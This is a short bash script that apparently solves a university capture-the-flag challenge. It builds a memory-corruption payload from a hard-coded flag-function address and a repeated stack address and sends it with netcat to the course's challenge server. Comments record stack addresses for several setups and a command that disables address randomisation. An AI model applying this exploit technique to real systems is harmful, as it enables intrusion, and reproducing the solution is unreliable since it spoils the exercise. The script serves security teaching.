#!/bin/bash

base=$'\x4c\xca\xff\xff'
str_addr=$''
flag_addr=$'\xb5\x88\x04\x08'

for i in {1..1250}
do
    str_addr=$str_addr$base
done

echo -e $flag_addr$str_addr | nc cs412-ctf.epfl.ch 10003 #setarch `arch` -R ./3


# exe \x3c\xbb\xff\xff
# 3 \x4c\xbb\xff\xff
# online \x4c\xca\xff\xff
